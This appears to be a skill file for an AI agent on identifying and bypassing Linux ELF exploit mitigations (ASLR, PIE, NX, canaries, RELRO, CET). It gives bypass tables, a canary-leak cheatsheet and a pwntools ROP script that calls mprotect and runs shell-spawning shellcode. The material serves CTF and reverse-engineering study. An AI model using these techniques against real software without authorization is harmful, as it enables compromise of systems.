---
name: binary-protection-bypass
description: "Identify and bypass binary mitigations (ASLR, PIE, NX/DEP, stack canary, RELRO, FORTIFY, CET, MTE) on ELF binaries. Activate after anti-debug is cleared and before binary-patcher when standard JE/JNE patches fail due to mitigation."
allowed-tools: Read, Write, Edit, Glob, Grep, Bash
---

# Binary Protection Bypass

> **Upstream reference**: [yaklang/hack-skills/binary-protection-bypass](https://github.com/yaklang/hack-skills/tree/main/skills/binary-protection-bypass) — facts/tables distilled from ctf-wiki.
> Final user-facing summary in Vietnamese.

## 0. Authorization & routing

Operates under [MASTER_POLICY.md](../MASTER_POLICY.md) §1-§2.

| Sibling skill | When |
|---|---|
| [anti-debugging-techniques](../anti-debugging-techniques/SKILL.md) | Run first — debugger must stay attached to test exploit primitives |
| [symbolic-execution-tools](../symbolic-execution-tools/SKILL.md) | Use angr to find leak primitives or compute ROP chains automatically |
| [vm-and-bytecode-reverse](../vm-and-bytecode-reverse/SKILL.md) | When the protected program runs inside a custom VM |
| [binary-patcher](../binary-patcher/SKILL.md) | Apply final patches once mitigations are bypassed |

## 1. Identification

```bash
# Linux / WSL
checksec --file=./binary
readelf -h ./binary | grep Type           # PIE if Type: DYN
readelf -l ./binary | grep -E 'GNU_(STACK|RELRO)'
cat /proc/sys/kernel/randomize_va_space   # 0/1/2 = off/partial/full
```

```powershell
# Windows — use checksec.exe inside a Linux WSL or analyse PE separately
wsl checksec --file=./binary
```

| Mitigation | Quick check | Build flag that turns it on |
|---|---|---|
| ASLR | `cat /proc/sys/kernel/randomize_va_space` | OS-level |
| PIE | `readelf -h` → `Type: DYN` | `-pie -fPIE` |
| NX | `readelf -l` → no RWE segment | default since GCC 4.6 |
| Canary | symbol `__stack_chk_fail` | `-fstack-protector-strong` |
| Partial RELRO | `GNU_RELRO` segment, `.got.plt` writable | `-Wl,-z,relro` |
| Full RELRO | `.got` read-only after load | `-Wl,-z,relro,-z,now` |
| FORTIFY | symbols `__printf_chk`, `__memcpy_chk` | `-D_FORTIFY_SOURCE=2` |
| CET | NT_GNU_PROPERTY `IBT`/`SHSTK` | `-fcf-protection=full` |
| MTE (ARM64) | `HWCAP2_MTE` at runtime | hardware-dependent |

## 2. Mitigation × bypass primitive

| Mitigation | Defeats | Required primitive | Common technique |
|---|---|---|---|
| ASLR | Hardcoded libc addresses | Read primitive | Format-string `%N$p`, leak via `puts(GOT)` |
| PIE | Hardcoded `.text` addresses | Read primitive OR partial overwrite (12 low bits fixed per page) | leak from saved RIP; or 1-2 byte overwrite for 1/16 brute |
| NX | Stack/heap shellcode | Stack overflow | ROP / ret2libc / ret2csu / ret2dlresolve / SROP |
| Stack canary | Stack overflow | Read past canary OR fork-server byte-by-byte oracle | leak `fs:[0x28]`; child crashes reveal each byte |
| Partial RELRO | GOT overwrite of `.got.plt` | Write primitive | Overwrite GOT entry of called function |
| Full RELRO | GOT overwrite | Heap / arbitrary write to writable hooks | `__free_hook` / `__malloc_hook`; FILE struct attacks; tcache-poison |
| FORTIFY | Bounded `__printf_chk` etc. | n/a | Find non-fortified call site; or attack via `_chk` argument count check |
| CET (IBT) | Indirect calls without `endbr` target | Find legit `endbr` gadgets | Stay on `endbr64` boundaries; SROP often ok |
| CET (Shadow stack) | ret to non-shadowed addr | Memory write into SS | rare in CTF; usually skip arch where SS enabled |
| MTE | Tag mismatch on UAF | Tag oracle / brute force | 4-bit tag → 1/16 brute when reuse possible |

## 3. ASLR / PIE entropy on x86-64 Linux

| Region | Entropy (bits) | Slots |
|---|---|---|
| Stack | 22 | ~4M |
| mmap / libc | 28 | ~256M |
| Heap (brk) | 13 | ~8K |
| PIE base | 28 | ~256M |

Practical implication: brute force only viable on 32-bit or with reconnect oracles; otherwise need a leak.

## 4. ROP staples (defeat NX)

```python
# pwntools — typical mprotect ROP to drop to shellcode
from pwn import *
exe = ELF('./vuln'); libc = exe.libc
r = process('./vuln')

pop_rdi = 0x401234        # find with ROPgadget --binary ./vuln
pop_rsi = 0x401236
pop_rdx = 0x401238
mprotect = libc.sym['mprotect']
shellcode = asm(shellcraft.sh(), arch='amd64')

page = 0x404000           # a writable page of the binary
chain  = b'A' * 40
chain += p64(pop_rdi) + p64(page)
chain += p64(pop_rsi) + p64(0x1000)
chain += p64(pop_rdx) + p64(7)            # PROT_RWX
chain += p64(mprotect)
chain += p64(page + 0x100)                # jump to shellcode
r.sendline(chain)
r.send(b'\x00' * 0x100 + shellcode)
r.interactive()
```

Other NX-defeating routes: `ret2libc(system, "/bin/sh")`, `ret2csu` for arbitrary 3-arg calls without dedicated gadgets, `SROP` (one `sigreturn` gadget sets every register from a fake `ucontext`), `ret2dlresolve` (forge `Elf64_Sym`/`Elf64_Rela` to resolve arbitrary symbol).

## 5. Canary handling cheatsheet

| Scenario | Technique |
|---|---|
| Format-string leak | `%N$lx` until you see canary on stack (low byte always `0x00`) |
| Read primitive | `read(stdout, &canary, 8)` style; or arbitrary read |
| Fork server | brute byte-by-byte; correct byte → child stays alive |
| Master canary | leak from `fs:[0x28]` (TLS) or `pthread`'s `stack_guard` field |
| `__stack_chk_fail` hijack | overwrite GOT of `__stack_chk_fail` (Partial RELRO) |

## 6. RELRO ladder

```
Partial RELRO  →  GOT.plt of called function still writable  →  classic GOT overwrite
Full RELRO     →  GOT read-only  →  pivot to writable hooks:
   - __free_hook / __malloc_hook  (glibc <2.34)
   - exit_funcs / __exit_funcs    (rtld_global)
   - FILE vtable (_IO_FILE / _IO_jump_t)  via fclose, exit, abort
   - tcache poisoning → arbitrary write to next allocation
```

## 7. Methodology

1. Run `checksec`; record exact mitigation set.
2. Find a **read primitive** — without one, ASLR/PIE/canary all stand. Format-string and OOB-read are common gifts.
3. Find a **write primitive** sized for the target overwrite.
4. Pick the bypass row in §2 matching primitive ↔ mitigation pair.
5. Build the chain with `pwntools` + `ROPgadget`/`ropper`.
6. If multiple mitigations stack (e.g. PIE + canary + Full RELRO) you'll typically need two leaks (libc + PIE) and one robust write.

## 8. Tooling

| Tool | Use |
|---|---|
| `checksec` (pwn-tools) | One-line mitigation listing |
| `pwntools` | ELF parsing, ROP chain builder, exploit dev |
| `ROPgadget`, `ropper` | Gadget search |
| `one_gadget` | Find single-call shells in libc |
| `LIEF` | Programmatic ELF rewriting |
| `angr` (see [symbolic-execution-tools](../symbolic-execution-tools/SKILL.md)) | Auto-find leak path / compute constraints |

## 9. Vietnamese final summary template

```
🛡️ Phân tích & bypass mitigation:
  📋 Mitigation set : <ASLR|PIE|NX|Canary|Full RELRO|FORTIFY|CET>
  🔓 Leak primitive : <format-string %N$p | OOB read | UAF read>
  ✏️ Write primitive: <stack overflow | heap UAF | arbitrary write>
  🔗 Chain          : <ROP/ret2libc/ret2csu/SROP/ret2dlresolve>
  📂 Exploit script : exploit.py

▶  Tiếp:
   binary-patcher (vá vĩnh viễn) hoặc giữ exploit để chạy runtime.
```
